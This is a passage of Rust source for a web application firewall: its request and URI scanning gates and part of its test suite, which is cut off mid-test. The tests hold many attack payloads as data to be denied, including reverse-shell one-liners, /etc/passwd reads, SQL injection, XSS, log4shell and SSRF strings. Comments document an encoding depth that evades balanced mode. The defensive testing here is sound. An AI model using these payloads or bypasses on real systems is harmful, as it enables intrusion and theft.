    // The JSON-structural gates (4/5) apply only to an allowed application/json
    // body; a disallowed type is still injection-scanned but never JSON-parsed.
    let is_json = is_allowed
        && ct
            .as_bytes()
            .get(..16)
            .map(|b| b.eq_ignore_ascii_case(b"application/json"))
            .unwrap_or(false);

    // ── Gate 3: Aho-Corasick injection scan (O(N), single pass) ──
    // Profile-driven scanner: balanced (default) or aggressive.
    let scanner = scanner_for(profile.mode);

    // Scan raw body first (fast path — no alloc if no encoding present).
    if scanner.is_match(body) {
        return WafVerdict::Deny("injection pattern detected");
    }

    // Normalized scan: URL-decode, strip SQL comments, normalize JSON unicode.
    // Each layer prevents a different evasion class:
    //   - url_decode: %27, %3C, %2F, + → space
    //   - strip_sql_comments: union/**/select → union select
    //   - normalize_json_unicode: \u0027 → ', \u003c → <
    let needs_decode = memchr::memchr(b'%', body).is_some() || memchr::memchr(b'+', body).is_some();
    let has_sql_comments = body.windows(2).any(|w| w == b"/*");
    let has_unicode_esc = body.windows(2).any(|w| w == b"\\u");
    // Whitespace-run evasion: a tab/VT/FF or a doubled space lets an attacker
    // pad a pattern ("union  select", "1;\tcat") past the raw scan; the
    // normalized pass collapses these, so run it when they are present too.
    let has_ws_evasion = body.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
        || body.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');

    if needs_decode || has_sql_comments || has_unicode_esc || has_ws_evasion {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                // First pass from body -> out
                normalize_unified(body, &mut out);

                // Iterate until convergence or safety cap.
                // 2 iterations catches double/triple encoding (real-world max).
                // Convergence check breaks early if no further decoding is needed.
                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    // Recursive pass: out -> sec, then swap
                    normalize_unified(&out, &mut sec);

                    // If output didn't change, we've converged — stop
                    if *out == *sec {
                        break;
                    }

                    std::mem::swap(&mut *out, &mut *sec);
                }

                // Final check after convergence
                if scanner.is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                }

                // Shrink inflated buffers to prevent OOM from adversarial large bodies.
                // A single 10MB POST would permanently inflate all worker threads.
                if out.capacity() > 65_536 {
                    out.shrink_to(8192);
                }
                if sec.capacity() > 65_536 {
                    sec.shrink_to(8192);
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }

    // ── Gate 4: Entropy analysis (detect obfuscated payloads) ──
    // Only scan bodies ≥ 256 bytes (smaller payloads lack a meaningful
    // sample). For JSON content-types, restrict the calculation to bytes
    // inside string literals so structural punctuation and numeric
    // tokens don't dilute the signal. Threshold and kill-switch are
    // per-profile (`entropy_threshold`, `entropy_check`).
    if profile.entropy_check && body.len() >= 256 {
        let entropy = if is_json {
            // Need ≥128 string-content bytes to draw a conclusion. If the
            // JSON is mostly structure (nested arrays of numbers, etc.),
            // skip the gate rather than report a misleading reading.
            shannon_entropy_json_strings(body, 128)
        } else {
            Some(shannon_entropy(body))
        };
        if let Some(e) = entropy {
            if e > profile.entropy_threshold {
                return WafVerdict::Deny("suspicious payload entropy");
            }
        }
    }

    // ── Gate 5: JSON structural validation ──
    if is_json {
        return validate_json_structure(body, profile.max_depth, profile.max_string_len);
    }

    WafVerdict::Allow
}

/// Validate a request URI (path + query string) through the injection scanner.
/// Called for ALL methods to catch SQLi/XSS in query parameters.
/// Zero cost if no patterns match (single O(N) pass).
///
/// Mode comes from the route's WAF profile so URI scanning matches body
/// scanning: a route in `balanced` mode won't deny a query string that
/// only the `aggressive` pattern set would catch.
#[inline]
pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
    let scanner = scanner_for(mode);

    // Scan raw URI
    if scanner.is_match(uri.as_bytes()) {
        return WafVerdict::Deny("injection pattern in URI");
    }
    // Normalized URI scan: URL-decode + SQL comment strip + JSON unicode
    let uri_bytes = uri.as_bytes();
    let needs_decode =
        memchr::memchr(b'%', uri_bytes).is_some() || memchr::memchr(b'+', uri_bytes).is_some();
    let has_sql_comments = uri_bytes.windows(2).any(|w| w == b"/*");
    // Whitespace-run evasion (raw tab/VT/FF or doubled space) — same rationale
    // as the body gate in validate_request.
    let has_ws_evasion = uri_bytes.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
        || uri_bytes.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');

    if needs_decode || has_sql_comments || has_ws_evasion {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                normalize_unified(uri_bytes, &mut out);

                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    normalize_unified(&out, &mut sec);
                    if *out == *sec {
                        break;
                    }
                    std::mem::swap(&mut *out, &mut *sec);
                }

                if scanner.is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }
    WafVerdict::Allow
}

// ═══════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── Streaming scanner (Track D) ──

    #[test]
    fn pattern_lengths_fit_max() {
        // Invariant the streaming overlap relies on. If a new pattern
        // longer than MAX_PATTERN_LEN lands in BALANCED / AGGRESSIVE,
        // the overlap buffer would no longer guarantee match correctness
        // for boundary-spanning matches, and this test catches it.
        for p in BALANCED_PATTERNS
            .iter()
            .chain(AGGRESSIVE_EXTRA_PATTERNS.iter())
        {
            assert!(
                p.len() < MAX_PATTERN_LEN,
                "pattern {p:?} ({}) >= MAX_PATTERN_LEN ({})",
                p.len(),
                MAX_PATTERN_LEN,
            );
        }
    }

    #[test]
    fn streaming_clean_chunks_allow_all() {
        let mut s = StreamingScanner::new(WafMode::Balanced, 10 * 1_048_576);
        for chunk in [
            b"hello ".as_slice(),
            b"world ".as_slice(),
            b"\xff\x00\x01".as_slice(),
        ] {
            assert_eq!(s.feed(chunk), StreamVerdict::Allow);
        }
    }

    #[test]
    fn streaming_denies_pattern_in_first_chunk_early_exit() {
        let mut s = StreamingScanner::new(WafMode::Aggressive, 10 * 1_048_576);
        // SQLi token (aggressive-tier "union select") in first chunk — the
        // second chunk should not even be needed.
        let v = s.feed(b"foo bar union select 1,2,3 baz");
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_catches_pattern_split_across_chunks() {
        // The pattern 'union select' (12 bytes) is split exactly at the
        // chunk boundary. Without an overlap buffer this would be missed.
        let mut s = StreamingScanner::new(WafMode::Aggressive, 10 * 1_048_576);
        assert_eq!(s.feed(b"prefix union sel"), StreamVerdict::Allow);
        let v = s.feed(b"ect 1 from t");
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_overflows_max_body() {
        let mut s = StreamingScanner::new(WafMode::Balanced, 8); // tiny limit
        assert_eq!(s.feed(b"abcd"), StreamVerdict::Allow);
        let v = s.feed(b"efghij"); // 4 + 6 = 10 > 8
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_overlap_size_is_bounded() {
        // Feed many chunks; the internal overlap must never grow
        // beyond MAX_PATTERN_LEN bytes.
        let mut s = StreamingScanner::new(WafMode::Balanced, 1_048_576);
        for _ in 0..100 {
            assert_eq!(s.feed(&[b'a'; 4096]), StreamVerdict::Allow);
        }
        assert!(
            s.overlap.len() < MAX_PATTERN_LEN,
            "overlap grew unbounded: {} bytes",
            s.overlap.len()
        );
        assert!(s.bytes_seen() == 100 * 4096);
    }

    // ── End streaming-scanner tests ──

    fn url_decode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn strip_sql_comments(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn normalize_json_unicode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    /// Default-config profile (Balanced mode, entropy gate on at 6.5).
    /// Historically called `strict` — the name is kept to minimise diff
    /// noise in existing assertions; semantics now match the runtime
    /// default a real deployment will see.
    fn strict_profile() -> WafProfile {
        WafProfile::default()
    }

    /// Aggressive-mode profile: balanced patterns plus broad-substring
    /// patterns (alert(, eval(, $gt, os.system(, …). Body inspection is
    /// otherwise unchanged.
    fn aggressive_profile() -> WafProfile {
        WafProfile {
            mode: WafMode::Aggressive,
            ..WafProfile::default()
        }
    }

    fn relaxed_profile() -> WafProfile {
        WafProfile {
            max_body_mb: 100,
            max_depth: 20,
            max_string_len: 10_485_760,
            deny_unknown_content_types: false,
            allowed_content_types: vec![
                "application/json".to_string(),
                "multipart/form-data".to_string(),
                "application/xml".to_string(),
            ],
            ..WafProfile::default()
        }
    }

    // ── Gate 1: Body size ──

    #[test]
    fn allows_valid_json() {
        let body = br#"{"username":"admin","password":"secret123"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_oversized_body() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn denies_body_size_zero_mb_limit() {
        let profile = WafProfile {
            max_body_mb: 0,
            ..WafProfile::default()
        };
        assert_eq!(
            validate_request("POST", Some("application/json"), b"x", &profile),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn get_with_oversized_body_still_checked() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("GET", None, &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    // ── Gate 2: Content-Type ──

    #[test]
    fn denies_missing_content_type() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", None, body, &strict_profile()),
            WafVerdict::Deny("missing content-type header")
        );
    }

    #[test]
    fn strict_denies_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &strict_profile()),
            WafVerdict::Deny("unexpected content-type for API request")
        );
    }

    #[test]
    fn relaxed_allows_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_case_insensitive() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", Some("Application/JSON"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_with_charset() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json; charset=utf-8"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_multipart() {
        let body = b"--boundary\r\nContent-Disposition: form-data\r\n\r\ndata";
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data; boundary=abc"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    // ── Gate 3: Injection scanner ──

    #[test]
    fn denies_sql_injection() {
        let body = br#"{"user":"admin' OR '1'='1","pass":"x"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss() {
        let body = br#"{"name":"<script>alert(1)</script>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_command_injection() {
        let body = br#"{"file":"; cat /etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_reverse_shell_balanced() {
        // Unambiguous Unix command-injection forms are caught in balanced too.
        for body in [
            br#"{"x":"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}"#.as_slice(),
            br#"{"x":"foo; nc -e /bin/sh 10.0.0.1 4444"}"#.as_slice(),
            br#"{"x":"a${IFS}cat${IFS}/etc/passwd"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_cmdi_substitution_aggressive() {
        // Command substitution + bare metachar+command (FP-prone → aggressive).
        for body in [
            br#"{"x":"$(id)"}"#.as_slice(),
            br#"{"x":"ls | whoami"}"#.as_slice(),
            br#"{"x":"x && ls -la /"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn allows_benign_shell_like_text() {
        // Precision guard: legit prose/code that *looks* shell-ish must pass —
        // a regression here is a false positive (the corpus's hard fail).
        for body in [
            br#"{"note":"let x = a && b || c;"}"#.as_slice(),
            br#"{"name":"O'Brien & D'Angelo Sons, Inc."}"#.as_slice(),
            br#"{"q":"the union of designers and engineers"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Allow,
                "false positive: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_ssrf_internal_schemes_balanced() {
        for body in [
            br#"{"u":"gopher://127.0.0.1:11211/_stats"}"#.as_slice(),
            br#"{"u":"dict://127.0.0.1:11211/stat"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_ssrf_loopback_and_deser_aggressive() {
        for body in [
            br#"{"u":"http://localhost:6379/"}"#.as_slice(),
            br#"{"u":"http://127.0.0.1:22"}"#.as_slice(),
            br#"{"u":"http://2130706433/"}"#.as_slice(),
            br#"{"x":"rO0ABXNyAA=="}"#.as_slice(),
            br#"{"x":"constructor[prototype][isAdmin]=true"}"#.as_slice(),
            br#"{"x":"!!python/object/apply:os.system ['id']"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_sqli_error_based_balanced() {
        let body = br#"{"q":"1 AND extractvalue(1,concat(0x7e,version()))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_empty_function_aggressive() {
        // Precision guard: an empty JS function `() {` must NOT trip the
        // shellshock pattern (`() { :`). A regression here is a false positive.
        let body = br#"{"code":"const f = () => {}; function g() { return 1; }"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Allow,
            "false positive on empty function"
        );
    }

    #[test]
    fn denies_corpus_v2_round_aggressive() {
        // The corpus-v2 (OWASP CRS + PayloadsAllTheThings) round: high-frequency
        // real-world misses added to the aggressive set. One assertion per family.
        let p = aggressive_profile();
        for body in [
            &br#"{"x":"<?php system('id'); ?>"}"#[..],   // php tag + func
            &br#"{"x":"shell_exec('ls')"}"#[..],         // php dangerous func
            &br#"{"x":"java.lang.Process"}"#[..],        // java gadget class
            &br#"{"x":"java.io.PrintStream"}"#[..],      // java io class
            &br#"{"x":"file:///etc/passwd"}"#[..],       // ssrf/lfi scheme
            &br#"{"x":"jar:http://evil.co/b.zip!a"}"#[..], // ssrf jar scheme
            &br#"{"x":"& net view"}"#[..],               // windows cmdi
            &br#"{"x":"| sleep 15"}"#[..],               // metachar sleep
            &br#"{"name__startswith":"a"}"#[..],         // django/orm lookup injection
            &br#"{"x":"compress.bzip2://file.bz2"}"#[..], // php stream wrapper
            &br#"{"x":"@{[ system 'id' ]}"}"#[..],       // perl ssti
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &p),
                WafVerdict::Deny("injection pattern detected"),
                "corpus-v2 round should block: {:?}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    #[test]
    fn allows_corpus_v2_round_benign_aggressive() {
        // Precision guards for the corpus-v2 round: legit prose that name-drops
        // "system", "file", "java", "process" must NOT trip (the patterns are
        // anchored to call/scheme syntax, not bare words).
        let p = aggressive_profile();
        for body in [
            &br#"{"q":"how does the file system handle large uploads"}"#[..],
            &br#"{"q":"a java tutorial for beginners with process diagrams"}"#[..],
            &br#"{"q":"please ftp the file later, the system looks healthy"}"#[..],
            &br#"{"q":"sort results by startswith then by name"}"#[..],
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &p),
                WafVerdict::Allow,
                "false positive on benign prose: {:?}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    #[test]
    fn denies_path_traversal() {
        let body = br#"{"path":"../../../etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssrf_aws_metadata() {
        let body = br#"{"url":"http://169.254.169.254/latest/meta-data/"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_log4shell() {
        let body = br#"{"header":"${jndi:ldap://evil.com/a}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_prototype_pollution() {
        // "__proto__" is aggressive-tier (false-positive on JS prose under
        // balanced); a strict/admin route still catches it.
        let body = br#"{"__proto__":{"admin":true}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_url_encoded_sqli() {
        // %27 = ', %4F = O, %52 = R — URL-encoded SQL injection
        let body = br#"{"user":"admin%27 OR %271%27=%271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_url_encoded_xss() {
        // %3C = <, %3E = >, %61lert = alert — fully encoded to evade raw scan
        let body = br#"{"name":"%3Cscript%3E%61lert(1)%3C/script%3E"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_double_url_encoded_sqli() {
        // %2527 → %27 → ' (double encoded)
        let body = br#"{"user":"admin%2527 OR %25271%2527=%25271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_triple_url_encoded_sqli() {
        // %252527 → %2527 → %27 → ' (triple encoded)
        let body = br#"{"user":"admin%252527 OR %2525271%252527=%2525271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn aggressive_denies_quadruple_url_encoded_xss() {
        // %25253C → %253C → %3C → < requires 4 normalisation passes; the
        // decode loop performs at most 3, so the *encoded* `<script` part
        // is not what catches this body. The raw `alert(` literal does —
        // and `alert(` lives in the AGGRESSIVE pattern set. This test pins
        // that aggressive mode picks it up; balanced will not (covered by
        // `balanced_allows_quadruple_url_encoded_xss` below).
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        let result = validate_request(
            "POST",
            Some("application/json"),
            body,
            &aggressive_profile(),
        );
        assert!(
            matches!(result, WafVerdict::Deny(_)),
            "expected Deny, got {result:?}"
        );
    }

    #[test]
    fn balanced_allows_quadruple_url_encoded_xss() {
        // Same body, balanced mode: `alert(` is no longer a balanced
        // pattern, and 4-level encoding outruns the 3-pass decode loop —
        // so `<script` is never exposed. Expected outcome: Allow.
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_denies_triple_url_encoded_xss_via_script_tag() {
        // Triple-encoded `<script` decodes within the 3-pass decode loop
        // and matches the balanced pattern `<script`. Pins the decode-loop
        // recursion still works when targeting a high-precision pattern.
        // %25253c → %253c → %3c → <
        let body = br#"{"html":"%25253cscript src=evil>"}"#;
        assert!(matches!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny(_)
        ));
    }

    // ── URI scanning ──

    #[test]
    fn uri_denies_sqli_in_query() {
        // "' or 1=1" is in the pattern list
        assert_eq!(
            validate_uri("/api/users?id=' or 1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_allows_safe_path() {
        assert_eq!(
            validate_uri("/api/v1/users?page=2&sort=name", WafMode::Balanced),
            WafVerdict::Allow
        );
    }

    #[test]
    fn uri_denies_encoded_traversal() {
        // "../../../" is the pattern — 3 levels of traversal
        assert_eq!(
            validate_uri("/api/files?path=../../../etc/passwd", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_encoded_traversal_pct() {
        // %2e%2e%2f is literally in the pattern list, so matches on raw scan
        assert_eq!(
            validate_uri(
                "/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log",
                WafMode::Balanced
            ),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_double_encoded_traversal() {
        // %252e%252e%252f → %2e%2e%2f → ../ (matches after recursive decode)
        assert_eq!(
            validate_uri(
                "/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log",
                WafMode::Balanced,
            ),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn allows_safe_payload() {
        let body = br#"{"username":"john_doe","email":"john@example.com","age":30}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Gate 5: JSON structural ──

    #[test]
    fn denies_malformed_json() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn denies_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn relaxed_allows_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_at_exact_max_depth() {
        let mut json = String::from("1");
        for _ in 0..10 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_one_past_max_depth() {
        let mut json = String::from("1");
        for _ in 0..11 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_string_value() {
        let long = "x".repeat(1_048_577);
        let body = format!(r#"{{"key":"{long}"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_key_name() {
        let long_key = "k".repeat(1_048_577);
        let body = format!(r#"{{"{long_key}":"value"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_deeply_nested_array() {
        let mut json = String::from("1");
        for _ in 0..12 {
            json = format!("[{json}]");
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn allows_json_with_all_value_types() {
        let body = br#"{"str":"v","num":42,"float":3.14,"bool":true,"null":null,"arr":[1],"obj":{"k":"v"}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_array_within_depth() {
        let body = br#"{"items":[1,2,3]}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Method filtering ──

    #[test]
    fn allows_get_without_body() {
        assert_eq!(
            validate_request("GET", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_delete_without_body() {
        assert_eq!(
            validate_request("DELETE", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_head_without_body() {
        assert_eq!(
            validate_request("HEAD", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_options_without_body() {
        assert_eq!(
            validate_request("OPTIONS", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_post_empty_body() {
        assert_eq!(
            validate_request("POST", Some("application/json"), &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn put_validates_body() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("PUT", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn patch_validates_body() {
        let body = br#"{"valid": true}"#;
        assert_eq!(
            validate_request("PATCH", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Entropy ──

    #[test]
    fn allows_normal_entropy() {
        let body = br#"{"name":"John Doe","email":"john@example.com","message":"Hello, this is a normal message with typical text content."}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Shannon entropy unit test ──

    #[test]
    fn entropy_constant_is_zero() {
        let data = vec![b'A'; 100];
        assert!(shannon_entropy(&data) < 0.01);
    }

    #[test]
    fn entropy_random_is_high() {
        // Simulated high entropy (all 256 byte values)
        let data: Vec<u8> = (0..=255).cycle().take(512).collect();
        assert!(shannon_entropy(&data) > 7.5);
    }

    #[test]
    fn entropy_normal_text_is_moderate() {
        let data =
            b"This is a normal English text with reasonable entropy levels for testing purposes.";
        let e = shannon_entropy(data);
        assert!(e > 3.0 && e < 5.5, "entropy was {e}");
    }

    // ── Plus-to-space evasion ──

    #[test]
    fn url_decode_converts_plus_to_space() {
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"union+select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_plus_encoded_sqli_in_body() {
        // "union+select" → "union select" after + normalization. "union select"
        // is aggressive-tier now (false-positive on prose under balanced).
        let body = br#"{"query":"union+select+*+from+users"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_plus_encoded_sqli() {
        assert_eq!(
            validate_uri("/api/search?q='+or+1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn url_decode_handles_mixed_encoding() {
        // %27 = ' and + = space
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"admin%27+OR+%271%27=%271")).as_ref(),
            b"admin' or '1'='1"
        );
    }

    // ── SQL comment evasion ──

    #[test]
    fn strip_sql_comments_basic() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/**/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
